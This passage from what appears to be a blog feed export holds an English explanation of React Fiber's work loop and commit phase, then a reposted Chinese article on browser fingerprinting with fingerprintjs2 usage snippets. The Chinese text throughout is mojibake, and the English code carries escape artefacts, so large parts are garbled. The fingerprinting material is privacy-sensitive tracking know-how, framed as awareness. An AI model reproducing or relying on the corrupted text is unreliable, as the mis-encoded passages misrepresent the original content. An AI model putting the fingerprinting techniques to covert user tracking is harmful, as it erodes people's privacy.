[UNSAFE_]componentWillUpdate (deprecated) render As you can see, some legacy lifecycle methods that are executed during the render phase are marked as UNSAFE from the version 16.3. They are now called legacy lifecycles in the docs. They will be deprecated in future 16.x releases and their counterparts without the UNSAFE prefix will be removed in 17.0. You can read more about these changes and the suggested migration path here. Are you curious about the reason for this? Well, weâ€™ve just learned that because the render phase doesnâ€™t produce side-effects like DOM updates, React can process updates asynchronously to components asynchronously (potentially even doing it in multiple threads).However, the lifecycles marked with UNSAFE have often been misunderstood and subtly misused. Developers tended to put the code with side-effects inside these methods which may cause problems with the new async rendering approach. Although only their counterparts without the UNSAFE prefix will be removed, they are still likely to cause issues in the upcoming Concurrent Mode (which you can opt out of). Hereâ€™s the list of lifecycle methods executed during the second commit phase: getSnapshotBeforeUpdate componentDidMount componentDidUpdate componentWillUnmount Because these methods execute in the synchronous commit phase, they may contain side effects and touch the DOM. Okay, so now we have the background to take a look at generalized algorithm used to walk the tree and perform work. Letâ€™s dive in. Render phase#The reconciliation algorithm always starts from the topmost HostRoot fiber node using the renderRoot function. However, React bails out of (skips) already processed fiber nodes until it finds the node with unfinished work.For example, if you call setState deep in the components tree, React will start from the top but quickly skip over the parents until it gets to the component that had its setState method called. Main steps of the work loop#All fiber nodes are processed in the work loop. Here is the implementation of the synchronous part of the loop: 1234567function workLoop(isYieldy) &#123; if (!isYieldy) &#123; while (nextUnitOfWork !== null) &#123; nextUnitOfWork = performUnitOfWork(nextUnitOfWork); &#125; &#125; else &#123;...&#125;&#125;&lt;&gt; In the code above, the nextUnitOfWork holds a reference to the fiber node from the workInProgress tree that has some work to do. As React traverses the tree of Fibers, it uses this variable to know if thereâ€™s any other fiber node with unfinished work. After the current fiber is processed, the variable will either contain the reference to the next fiber node in a tree or null. In that case React exits the work loop and is ready to commit the changes. There are 4 main functions that are used to traverse the tree and initiate or complete the work: performUnitOfWork beginWork completeUnitOfWork completeWork To demonstrate how they are used, take a look at the following animation of traversing a fiber tree. Iâ€™ve used the simplified implementation of these functions for the demo. Each function takes a fiber node to process and as React goes down the tree you can see the currently active fiber node changes. You can clearly see on the video how the algorithm goes from one branch to the other. It first completes the work for children before moving to parents. Note that straight vertical connections denote siblings, whereas bent connections denote children, e.g. b1 doesnâ€™t have children, while b2 has one child c1. Hereâ€™s the link to the video where you can pause the playback and inspect the current node and the state of functions. Conceptually, you can think of â€œbeginâ€ as â€œstepping intoâ€ a component, and â€œcompleteâ€ as â€œstepping outâ€ of it. You can also play with the example and the implementation here as I explain what these functions do. Letâ€™s start with the first two functions performUnitOfWork and beginWork: 123456789101112function performUnitOfWork(workInProgress) &#123; let next = beginWork(workInProgress); if (next === null) &#123; next = completeUnitOfWork(workInProgress); &#125; return next;&#125;function beginWork(workInProgress) &#123; console.log('work performed for ' + workInProgress.name); return workInProgress.child;&#125;&lt;&gt; The function performUnitOfWork receives a fiber node from the workInProgress tree and starts the work by calling beginWork function. This is the function that will start all the activities that need to be performed for a fiber. For the purposes of this demonstration, we simply log the name of the fiber to denote that the work has been done. \The function** beginWork \always returns a pointer to the next child to process in the loop or** null\.** If thereâ€™s a next child, it will be assigned to the variable nextUnitOfWork in the workLoop function. However, if thereâ€™s no child, React knows that it reached the end of the branch and so it can complete the current node. \Once the node is completed, itâ€™ll need to perform work for siblings and backtrack to the parent after that.** This is done in the completeUnitOfWork function: 123456789101112131415161718192021222324252627function completeUnitOfWork(workInProgress) &#123; while (true) &#123; let returnFiber = workInProgress.return; let siblingFiber = workInProgress.sibling; nextUnitOfWork = completeWork(workInProgress); if (siblingFiber !== null) &#123; // If there is a sibling, return it // to perform work for this sibling return siblingFiber; &#125; else if (returnFiber !== null) &#123; // If there's no more work in this returnFiber, // continue the loop to complete the parent. workInProgress = returnFiber; continue; &#125; else &#123; // We've reached the root. return null; &#125; &#125;&#125;function completeWork(workInProgress) &#123; console.log('work completed for ' + workInProgress.name); return null;&#125;&lt;&gt; You can see that the gist of the function is a big while loop. React gets into this function when a workInProgress node has no children. After completing the work for the current fiber, it checks if thereâ€™s a sibling. If found, React exits the function and returns the pointer to the sibling. It will be assigned to the nextUnitOfWork variable and React will perform the work for the branch starting with this sibling. Itâ€™s important to understand that at this point React has only completed work for the preceding siblings. It hasnâ€™t completed work for the parent node. \Only once all branches starting with child nodes are completed does it complete the work for the parent node and backtracks.** As you can see from the implementation, both and completeUnitOfWork are used mostly for iteration purposes, whereas the main activities take place in the beginWork and completeWork functions. In the following articles in the series weâ€™ll learn what happens for the ClickCounter component and the span node as React steps into beginWork and completeWork functions. Commit phase#The phase begins with the function completeRoot. This is where React updates the DOM and calls pre and post mutation lifecycle methods. When React gets to this phase, it has 2 trees and the effects list. The first tree represents the state currently rendered on the screen. Then thereâ€™s an alternate tree built during the render phase. Itâ€™s called finishedWork or workInProgress in the sources and represents the state that needs to be reflected on the screen. This alternate tree is linked similarly to the current tree through the child and sibling pointers. And then, thereâ€™s an effects list â€” a subset of nodes from the finishedWork tree linked through the nextEffect pointer. Remember that the effect list is the result of running the render phase. The whole point of rendering was to determine which nodes need to be inserted, updated, or deleted, and which components need to have their lifecycle methods called. And thatâ€™s what the effect list tells us. \And itâ€™s exactly the set of nodes thatâ€™s iterated during the commit phase.** For debugging purposes, the current tree can be accessed through the current property of the fiber root. The finishedWork tree can be accessed through the alternate property of the HostFiber node in the current tree. The main function that runs during the commit phase is commitRoot. Basically, it does the following: Calls the getSnapshotBeforeUpdate lifecycle method on nodes tagged with the Snapshot effect Calls the componentWillUnmount lifecycle method on nodes tagged with the Deletion effect Performs all the DOM insertions, updates and deletions Sets the finishedWork tree as current Calls componentDidMount lifecycle method on nodes tagged with the Placement effect Calls componentDidUpdate lifecycle method on nodes tagged with the Update effect After calling the pre-mutation method getSnapshotBeforeUpdate, React commits all the side-effects within a tree. It does it in two passes. The first pass performs all DOM (host) insertions, updates, deletions and ref unmounts. Then React assigns the finishedWork tree to the FiberRoot marking the workInProgress tree as the current tree. This is done after the first pass of the commit phase, so that the previous tree is still current during componentWillUnmount, but before the second pass, so that the finished work is current during componentDidMount***\*/\****Update. In the second pass React calls all other lifecycle methods and ref callbacks. These methods are executed as a separate pass so that all placements, updates, and deletions in the entire tree have already been invoked. Hereâ€™s the gist of the function that runs the steps described above: 123456function commitRoot(root, finishedWork) &#123; commitBeforeMutationLifecycles() commitAllHostEffects(); root.current = finishedWork; commitAllLifeCycles();&#125;&lt;&gt; Each of those sub-functions implements a loop that iterates over the list of effects and checks the type of effects. When it finds the effect pertaining to the functionâ€™s purpose, it applies it. Pre-mutation lifecycle methods#Here is, for example, the code that iterates over an effects tree and checks if a node has the Snapshot effect: 12345678910function commitBeforeMutationLifecycles() &#123; while (nextEffect !== null) &#123; const effectTag = nextEffect.effectTag; if (effectTag &amp; Snapshot) &#123; const current = nextEffect.alternate; commitBeforeMutationLifeCycles(current, nextEffect); &#125; nextEffect = nextEffect.nextEffect; &#125;&#125;&lt;&gt; For a class component, this effect means calling the getSnapshotBeforeUpdate lifecycle method. DOM updates#commitAllHostEffects is the function where React performs DOM updates. The function basically defines the type of operation that needs to be done for a node and executes it: 123456789101112131415161718192021function commitAllHostEffects() &#123; switch (primaryEffectTag) &#123; case Placement: &#123; commitPlacement(nextEffect); ... &#125; case PlacementAndUpdate: &#123; commitPlacement(nextEffect); commitWork(current, nextEffect); ... &#125; case Update: &#123; commitWork(current, nextEffect); ... &#125; case Deletion: &#123; commitDeletion(nextEffect); ... &#125; &#125;&#125;&lt;&gt; Itâ€™s interesting that React calls the componentWillUnmount method as part of the deletion process in the commitDeletion function. Post-mutation lifecycle methods#commitAllLifecycles is the function where React calls all remaining lifecycle methods componentDidUpdate and componentDidMount. Weâ€™re finally done. Let me know what you think about the article or ask questions in the comments. \Check out the next article in the series In-depth explanation of state and props update in React.** I have many more articles in the works providing in-depth explanation for scheduler, children reconciliation process and how effects list is built. I also have plans to create a video where Iâ€™ll show how to debug the application using this article as a basis.]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æµè§ˆå™¨æŒ‡çº¹ï¼šåŸæ¥æˆ‘ä»¬ä¸€ç›´è¢«äº’è”ç½‘å·¨å¤´ç›‘è§†ï¼Œéšç§åœ¨ç½‘ä¸Šè£¸å¥”ã€æ— å¤„å¯è—]]></title>
    <url>%2F2020%2F07%2F24%2FWeb%E5%89%8D%E7%AB%AF%2F%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8C%87%E7%BA%B9%EF%BC%9A%E5%8E%9F%E6%9D%A5%E6%88%91%E4%BB%AC%E4%B8%80%E7%9B%B4%E8%A2%AB%E4%BA%92%E8%81%94%E7%BD%91%E5%B7%A8%E5%A4%B4%E7%9B%91%E8%A7%86%EF%BC%8C%E9%9A%90%E7%A7%81%E5%9C%A8%E7%BD%91%E4%B8%8A%E8%A3%B8%E5%A5%94%E3%80%81%E6%97%A0%E5%A4%84%E5%8F%AF%E8%97%8F%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªå‰ç«¯çœŸå¥½ç©ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://mp.weixin.qq.com/s/LvuB7PGBRmWHmQ6YcLrDkQ ä»Šå¤©è®²â¼€äº›è®©æ‚¨æŒ‰æºä¸ä½å’Œæ¬²æ±‚ä¸æ»¡çš„åæµè§ˆå™¨è¿½è¸ªæŠ€æœ¯ï¼Œæ­å¼€ä½ æ˜¯å¦‚æœè¢«äº’è”ç½‘å·¨å¤´ç›‘æ§çš„ã€‚ åœºæ™¯ä¸€ï¼šåœ¨â½¹ç«™ä¸Šæµè§ˆäº†æŸä¸ªå•†å“ï¼Œäº†è§£äº†ç›¸å…³çš„å•†å“ä¿¡æ¯ï¼Œä½†å¹¶æ²¡æœ‰ä¸‹å•è´­ä¹°ï¼Œç”šâ¾„æ²¡æœ‰è¿›â¾ç™»å½•æ“ä½œï¼Œè¿‡ä¸¤å¤©â½¤åŒå°ç”µè„‘è®¿é—®å…¶ä»–â½¹ç«™çš„æ—¶å€™å´å‘ç°å¾ˆå¤šåŒç±»å•†å“çš„â¼´å‘Šã€‚ åœºæ™¯äºŒï¼šåœ¨æŸåšå®¢ä¸­ä½ æœ‰å¤šä¸ªå°å·ï¼ˆæ°´å†›ï¼‰ï¼Œè¿™äº›å°å·çš„å­˜åœ¨å°±æ˜¯ä¸ºäº†åˆ·æŸä¸ªå¸–å­çš„çƒ­åº¦æˆ–è€…è¿›è¡Œèˆ†è®ºå¼•å¯¼ï¼Œåˆæˆ–è€…çº¯ç²¹è¿›è¡Œæµé‡äº¤æ˜“ï¼Œå³ä¾¿ä½ åœ¨åˆ‡æ¢è´¦å·çš„æ—¶å€™æ¸…ç©ºäº†cookieã€æœ¬åœ°ç¼“å­˜ï¼Œé‡å¼€è·¯ç”±å™¨ç”šè‡³ä½¿ç”¨ vpn æ¥è¿›è¡Œæ“ä½œï¼Œä½ è§‰å¾—è‡ªå·±è¶³å¤Ÿå°å¿ƒï¼Œå¹¶å°½å¯èƒ½æé«˜æ°´å†›çš„çœŸå®æ€§ï¼Œä½†æ˜¯ç®¡ç†äººå‘˜å¯èƒ½è¿˜æ˜¯çŸ¥é“è¿™æ˜¯åŒä¸€ä¸ªäººåœ¨æ“ä½œï¼Œä»è€Œè¢«æ‰“å‡»ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç½‘ç«™æˆ–è€…å¹¿å‘Šå•†éƒ½æƒ³è¦ä¸€ç§æŠ€æœ¯å¯ä»¥åœ¨ç½‘ç»œä¸Šç²¾ç¡®çš„å®šä½åˆ°æ¯ä¸€ä¸ªä¸ªä½“ï¼Œå°±ç®—ä½ æ²¡æœ‰è´¦å·ï¼Œæ²¡æœ‰ç™»å½•ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ”¶é›†è¿™äº›ä¸ªä½“çš„æ•°æ®ï¼Œç„¶ååŠ ä»¥åˆ†æä¹‹åæ›´åŠ ç²¾ç¡®çš„å»æ¨é€å¹¿å‘Šå’Œå…¶ä»–çš„ä¸€äº›æ´»åŠ¨ã€‚ è€Œè¿™ä¸ªæŠ€æœ¯å°±æ˜¯æµè§ˆå™¨æŒ‡çº¹ï¼Œè¿™è¿˜æ˜¯ç”¨å‰ç«¯æŠ€æœ¯æ¥å®ç°çš„ã€‚ å®šä¹‰æ¸¸è§ˆå™¨æŒ‡çº¹ï¼Œå°±åƒç°å®ç”Ÿæ´»ä¸­äººçš„æŒ‡çº¹ä¸€æ ·ï¼Œç‰¹å¼‚åœ°æ ‡è®°ç€æ¯ä¸ªä¸Šç½‘ç”¨æˆ·ã€‚ æµè§ˆå™¨æŒ‡çº¹ï¼šæ˜¯ä¸€ç§é€šè¿‡æµè§ˆå™¨å¯¹ç½‘ç«™å¯è§çš„é…ç½®å’Œè®¾ç½®ä¿¡æ¯æ¥è·Ÿè¸ªWebæµè§ˆå™¨çš„æ–¹æ³•ï¼Œæµè§ˆå™¨æŒ‡çº¹å°±åƒæˆ‘ä»¬äººæ‰‹ä¸Šçš„æŒ‡çº¹ä¸€æ ·ï¼Œå…·æœ‰ä¸ªä½“è¾¨è¯†åº¦ï¼Œåªä¸è¿‡ç°é˜¶æ®µæµè§ˆå™¨æŒ‡çº¹è¾¨åˆ«çš„æ˜¯æµè§ˆå™¨ã€‚ äººæ‰‹ä¸Šçš„æŒ‡çº¹ä¹‹æ‰€ä»¥å…·æœ‰å”¯ä¸€æ€§ï¼Œæ˜¯å› ä¸ºæ¯ä¸ªæŒ‡çº¹å…·æœ‰ç‹¬ç‰¹çš„çº¹è·¯ã€è¿™ä¸ªçº¹è·¯ç”±å‡¹å‡¸çš„çš®è‚¤æ‰€å½¢æˆã€‚æ¯ä¸ªäººæŒ‡çº¹çº¹è·¯çš„å·®å¼‚é€ å°±äº†å…¶ç‹¬ä¸€æ— äºŒçš„ç‰¹å¾ã€‚ é‚£ä¹ˆæµè§ˆå™¨æŒ‡çº¹ä¹Ÿæ˜¯åŒç†ï¼Œè·å–æµè§ˆå™¨å…·æœ‰è¾¨è¯†åº¦çš„ä¿¡æ¯ï¼Œè¿›è¡Œä¸€äº›è®¡ç®—å¾—å‡ºä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆè¿™ä¸ªå€¼å°±æ˜¯æµè§ˆå™¨æŒ‡çº¹ã€‚ è¾¨è¯†åº¦çš„ä¿¡æ¯å¯ä»¥æ˜¯UAã€æ—¶åŒºã€åœ°ç†ä½ç½®æˆ–è€…æ˜¯ä½ ä½¿ç”¨çš„è¯­è¨€ç­‰ç­‰ï¼Œä½ æ‰€é€‰å–çš„ä¿¡æ¯å†³å®šäº†æµè§ˆå™¨æŒ‡çº¹çš„å‡†ç¡®æ€§ã€‚ æŒ‡çº¹æŠ€æœ¯å†å² ç¬¬ 1 ä»£ï¼šæœåŠ¡ç«¯åœ¨å®¢æˆ·ç«¯è®¾ç½®æ ‡å¿— ç¬¬ä¸€ä»£æŒ‡çº¹è¿½è¸ªæ˜¯ cookie è¿™ç±»çš„æœåŠ¡ç«¯åœ¨å®¢æˆ·ç«¯è®¾ç½®æ ‡å¿—çš„è¿½è¸ªæŠ€æœ¯ï¼Œevercookie æ˜¯ cookie çš„åŠ å¼ºç‰ˆã€‚ ç¬¬ 2 ä»£ï¼šå•æµè§ˆå™¨æŒ‡çº¹ ç¬¬äºŒä»£æŒ‡çº¹è¿½è¸ªæ˜¯è®¾å¤‡æŒ‡çº¹æŠ€æœ¯ï¼Œå‘ç° IP èƒŒåçš„è®¾å¤‡ã€‚ é€šè¿‡ js è·å–æ“ä½œç³»ç»Ÿã€åˆ†è¾¨ç‡ã€åƒç´ æ¯”ç­‰ç­‰ä¸€ç³»åˆ—ä¿¡æ¯ï¼Œä¼ åˆ°åå°è®¡ç®—ï¼Œç„¶åå½’å¹¶è®¾å¤‡ã€‚ ç¬¬ 2.5 ä»£ï¼šè·¨æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«æŠ€æœ¯ã€‚ è·¨æµè§ˆå™¨ä¹‹åï¼Œç¬¬äºŒä»£æŠ€æœ¯ä¸­å¾ˆé‡è¦çš„ canvas æŒ‡çº¹ã€æµè§ˆå™¨æ’ä»¶æŒ‡çº¹éƒ½å˜äº†ï¼Œæ‰€ä»¥å¾ˆéš¾æŠŠè·¨æµè§ˆå™¨æŒ‡çº¹å½’å¹¶åˆ°åŒä¸€è®¾å¤‡ä¸Šã€‚ å› ä¸ºè®¾å¤‡æŒ‡çº¹ç›¸åŒï¼Œå¾ˆå¤§æ¦‚ç‡ä¸Šæ˜¯åŒä¸€å°è®¾å¤‡ï¼›ä½†æ˜¯ï¼Œè®¾å¤‡æŒ‡çº¹ä¸åŒæ—¶ï¼Œä¸ä¸€å®šä¸æ˜¯åŒä¸€å°è®¾å¤‡ã€‚ ç¬¬ä¸‰ä»£ï¼šè·¨è®¾å¤‡æŒ‡çº¹ ç¬¬ä¸‰ä»£æŒ‡çº¹è¿½è¸ªæŠ€æœ¯ï¼Œåˆ™æ˜¯å‘ç°è®¾å¤‡åé¢çš„äººã€‚é€šè¿‡äººçš„ä¹ æƒ¯ã€äººçš„è¡Œä¸ºç­‰ç­‰æ¥å¯¹äººè¿›è¡Œå½’å¹¶ï¼Œæ­¤é¡¹æŠ€æœ¯æ¯”è¾ƒå¤æ‚ã€‚ æ€» ç»“ ç¬¬ä¸€ä»£ã€ç¬¬äºŒä»£çš„æŒ‡çº¹è¿½è¸ªæŠ€æœ¯æ˜¯å¯ä»¥ç›´æ¥é€šè¿‡ js æ”¶é›†ä¿¡æ¯çš„ï¼Œç¬¬ä¸‰ä»£æŒ‡çº¹è¿½è¸ªæŠ€æœ¯ç›®å‰å¯çœ‹åˆ°çš„æ¡ˆä¾‹æ˜¯ 2017 å¹´ RSA åˆ›æ–°æ²™ç›’çš„å† å†› unifyid æŠ€æœ¯ï¼Œunifyid åœ¨ç§»åŠ¨ç«¯å®‰è£…è½¯ä»¶ã€æ”¶é›†ä¿¡æ¯ï¼Œä¸ä»…ä»…æ˜¯é€šè¿‡ jsã€‚ è‡³äºåˆ©ç”¨äº web ä¸Šï¼Œè¿˜ä»»é‡è€Œé“è¿œã€‚ åº”ç”¨ åˆ†æå¯èƒ½å¯¼è‡´è¯†åˆ«æ¬ºè¯ˆè€…å’Œå…¶ä»–éœ€è¦è°ƒæŸ¥çš„å¯ç–‘æ´»åŠ¨ â¼´å‘Šè¥é”€æœºå™¨è·å–æ‚¨çš„æ•°æ®ï¼Œä»¥ä¾¿è·Ÿè¸ªæ‚¨çš„åœ¨çº¿æ´»åŠ¨ é“¶â¾ä½¿â½¤æ­¤â½…æ³•æ¥è¯†åˆ«æ½œåœ¨çš„æ¬ºè¯ˆæ¡ˆä»¶ æ˜¯ä»€ä¹ˆè®©ä½ æš´éœ²èº«ä»½å½“ä½ ä½¿â½¤æµè§ˆå™¨è®¿é—®æŸä¸ªâ½¹ç«™çš„æ—¶å€™ï¼Œæµè§ˆå™¨ã€å¿…å®šä¼šæš´éœ²ã€‘æŸäº›ä¿¡æ¯ç»™è¿™ä¸ªâ½¹ç«™ã€‚ æœ‰äº›æ˜¯è·Ÿ HTTP åè®®ç›¸å…³çš„ã€‚ åªè¦ä½ åŸºäº HTTP åè®®è®¿é—®â½¹ç«™ï¼Œæµè§ˆå™¨å°±ã€å¿…å®šã€‘ä¼šä¼ è¾“è¿™äº›ä¿¡æ¯ç»™â½¹ç«™çš„æœåŠ¡å™¨ã€‚ å› æ­¤ï¼ŒWeb â½¹ç«™çš„æœåŠ¡å™¨å¿…å®šå¯ä»¥è·å–åˆ°è·Ÿä½ çš„æµè§ˆå™¨ç›¸å…³çš„æŸäº›ä¿¡æ¯ 12345678910111213&#123; &quot;headers&quot;: &#123; &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Host&quot;: &quot;httpbin.org&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;navigate&quot;, &quot;Sec-Fetch-Site&quot;: &quot;none&quot;, &quot;Sec-Fetch-User&quot;: &quot;?1&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&quot; &#125;&#125; åŸºæœ¬çš„æµè§ˆå™¨æŒ‡çº¹ æŒ‡çº¹é‡‡é›† ä¿¡æ¯ç†µï¼ˆentropyï¼‰æ˜¯æ¥æ”¶çš„æ¯æ¡æ¶ˆæ¯ä¸­åŒ…å«çš„ä¿¡æ¯çš„å¹³å‡é‡ï¼Œç†µè¶Šé«˜ï¼Œåˆ™èƒ½ä¼ è¾“è¶Šå¤šçš„ä¿¡æ¯ï¼Œç†µè¶Šä½ï¼Œåˆ™æ„å‘³ç€ä¼ è¾“çš„ä¿¡æ¯è¶Šå°‘ã€‚ æµè§ˆå™¨æŒ‡çº¹æ˜¯ç”±è®¸å¤šæµè§ˆå™¨çš„ç‰¹å¾ä¿¡æ¯ç»¼åˆèµ·æ¥çš„ï¼Œå…¶ä¸­ç‰¹å¾å€¼çš„ä¿¡æ¯ç†µä¹Ÿæ˜¯ä¸å°½ç›¸åŒã€‚ ç‚¹å‡» è¿™é‡Œ æŸ¥çœ‹è‡ªå·±çš„æµè§ˆå™¨æŒ‡çº¹IDå’ŒåŸºæœ¬ä¿¡æ¯ã€‚ è¿™ä¸ªç½‘ç«™ä¹Ÿå¯ä»¥æŸ¥çœ‹ä½ æµè§ˆå™¨çš„æŒ‡çº¹ç›¸å…³ä¿¡æ¯ï¼šhttps://amiunique.org/fpã€‚ å®ƒå¯æŸ¥çœ‹åˆ°å“ªäº›ä¿¡æ¯å‘¢ï¼Ÿå¦‚ä¸‹ï¼š è€Œä¸”æµè§ˆå™¨æŒ‡çº¹è¿˜æœ‰ä¸€ä¸ªå¼€æºé¡¹ç›®äº†ï¼Œçº¯ JS å®ç°çš„ï¼Œåªæœ‰å¼•ç”¨è¿™ä¸ªé¡¹ç›®å°±å¯ä»¥è·å–æµè§ˆå™¨çš„å„ç§ä¿¡æ¯æˆ–è€…ç³»ç»Ÿçš„é…ç½®äº†ã€‚ ç°ä»£è€Œçµæ´»çš„æµè§ˆå™¨æŒ‡çº¹åº“ï¼šhttps://github.com/Valve/fingerprintjs2ã€‚ ä½¿ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œå¦‚ä¸‹ï¼š å®‰è£…ï¼ˆInstallationï¼‰ Bower: bower install fingerprintjs2 NPM: npm install fingerprintjs2 Yarn: yarn add fingerprintjs2 ä½¿ç”¨ï¼ˆUsageï¼‰ 12345678910111213if (window.requestIdleCallback) &#123; requestIdleCallback(function () &#123; Fingerprint2.get(function (components) &#123; console.log(components) // an array of components: &#123;key: ..., value: ...&#125; &#125;) &#125;)&#125; else &#123; setTimeout(function () &#123; Fingerprint2.get(function (components) &#123; console.log(components) // an array of components: &#123;key: ..., value: ...&#125; &#125;) &#125;, 500)&#125; è¿˜æœ‰ä¸€ä¸ªç”¨çº¯JavaScriptç¼–å†™çš„è®¾å¤‡ä¿¡æ¯å’Œæ•°å­—æŒ‡çº¹çš„å¼€æºé¡¹ç›®ï¼šhttps://github.com/jackspirou/clientjsã€‚ æ€»ç»“ç§‘æŠ€å…¬å¸é€šè¿‡å¤§æ•°æ®ï¼Œä¼šå¯¹ä½ è¿›è¡Œä¸€ä¸ªå¤§ä½“çš„ç”»åƒï¼Œç„¶åæŒ‰ç…§ä½ çš„å–œå¥½æ¨é€ä¿¡æ¯ã€‚ æ¯”å¦‚ä¸€äº›ç²¾å‡†çš„å¹¿å‘Šï¼Œåˆºæ¿€ä½ è·å°”è’™çš„å°è§†é¢‘ç­‰ã€‚ å°±æ‹¿ä½ åœ¨ç©çš„æŠ–éŸ³æ¥è¯´ï¼Œä½ å…¶å®å¯ä»¥åŒ¿åä½¿ç”¨ï¼Œä½†æ˜¯ä½ çˆ±æŠ–èƒ¸å¦¹å­çš„å–œå¥½ï¼Œä¸ä¼šå› ä¸ºé‡è£…æŠ–éŸ³è€Œæ¶ˆå¤±ï¼Œå®ƒå·²ç†ŸçŸ¥äº†ä½ çš„ç™–å¥½ã€‚ è¿™äº›æ”¶é›†ä½ æµè§ˆå™¨ä¿¡æ¯çš„åŠ¨ä½œï¼Œé»˜é»˜çš„åœ¨åå°å‘ç”Ÿï¼Œç”¨æˆ·æ ¹æœ¬æ¯«æ— è§‰å¯Ÿã€‚ ä½ çš„æ¯ä¸€æ¬¡ç‚¹å‡»ï¼Œéƒ½æ— æƒ…çš„å‡ºå–äº†ä½ ï¼Œè¿™äº›ä¿¡æ¯ä¼šè¢«ç»¼åˆåˆ†æï¼Œç›¸å…³ç½‘ç«™å’Œéƒ¨é—¨ï¼Œèƒ½å¤Ÿå¯¹ä½ è¿›è¡Œå”¯ä¸€æ€§è¯†åˆ«ï¼Œè¿›è€Œé”å®šã€è¿½è¸ªã€‚ ä½ è™½ç„¶æ²¡æœ‰æ³¨å†Œè´¦å·ï¼Œå¹³å°å´ä¸ºä½ åˆ†é…äº†èº«ä»½ã€‚ è¿™æ˜¯è¯†åˆ«æ–¹å¼ï¼Œç”¨äºè¯†åˆ«ä½ è¿™ä¸ªä¸ªä½“ï¼Œè€Œæ”¶é›†çš„å†…å®¹ï¼Œå¯èƒ½æ›´è®©äººç ç›®ç»“èˆŒï¼Œä¸è¦è§‰å¾—åƒåœ¾æ•°æ®å¤šï¼Œå­˜ä¸ä¸‹ï¼Œè¡Œä¸ºæ•°æ®æ¯”é‚£äº›å»‰ä»·çš„ç£ç›˜ï¼Œå€¼é’±çš„å¤šã€‚ åŒ…æ‹¬ä½ çš„æ¯ä¸€æ¬¡ç‚¹å‡»ï¼Œåœç•™çš„æ—¶é•¿ï¼Œé˜…è¯»ã€è§‚çœ‹çš„ä½ç½®ï¼Œéƒ½åœ¨å…¨æ–¹ä½çš„å±•ç¤ºä½ çš„ä¸ªä½“ã€‚ è®¾å¤‡ã€IPã€ä½ç½®ã€æ“ä½œä¹ æƒ¯ï¼Œéƒ½åœ¨ä¸åŒçš„è§’åº¦ç»˜åˆ¶ä½ çš„æŒ‡çº¹ï¼Œè®©ä½ åœ¨åŒ¿åçš„äº’è”ç½‘ä¸Šï¼Œæ— å¤„å¯è—ã€‚ å¦‚æœä½ æ²¡æœ‰è¶³å¤Ÿä¸“ä¸šçš„çŸ¥è¯†æˆ–è€…éå¸¸é¢‘ç¹æ›´æ¢æµè§ˆå™¨ä¿¡æ¯çš„è¯ï¼Œå‡ ä¹ 100% å¯ä»¥é€šè¿‡æµè§ˆå™¨æŒ‡çº¹å®šä½åˆ°ä¸€ä¸ªç”¨æˆ·ï¼Œå½“ç„¶è¿™ä¹Ÿä¸è§å¾—å…¨æ˜¯åäº‹ã€‚ æ³„éœ²çš„éšç§éå¸¸ç‰‡é¢ï¼Œåªèƒ½è¯´æ³„éœ²äº†ç”¨æˆ·éƒ¨åˆ†æµè§ˆç½‘é¡µæ—¶çš„è¡Œä¸ºã€‚ ä»·å€¼ä¸å¤Ÿï¼Œç”¨æˆ·è¡Œä¸ºå¹¶æœªå°†å®é™…çš„è´¦æˆ·æˆ–è€…å…·ä½“çš„äººå¯¹åº”èµ·æ¥ï¼Œäº§ç”Ÿçš„ä»·å€¼æœ‰é™ã€‚ æœ‰ç›Šåˆ©ç”¨ï¼Œåˆ©ç”¨æµè§ˆå™¨æŒ‡çº¹å¯ä»¥éš”ç¦»éƒ¨åˆ†é»‘äº§ç”¨æˆ·ï¼Œé˜²æ­¢åˆ·ç¥¨æˆ–è€…éƒ¨åˆ†æ¶æ„è¡Œä¸ºã€‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¦‚ä½•è®¾è®¡é˜¿é‡Œç»æµä½“éƒ½åœ¨ç”¨çš„æ­å»ºæœåŠ¡-å¤©é©¬]]></title>
    <url>%2F2020%2F06%2F23%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E9%98%BF%E9%87%8C%E7%BB%8F%E6%B5%8E%E4%BD%93%E9%83%BD%E5%9C%A8%E7%94%A8%E7%9A%84%E6%90%AD%E5%BB%BA%E6%9C%8D%E5%8A%A1-%E5%A4%A9%E9%A9%AC%2F</url>
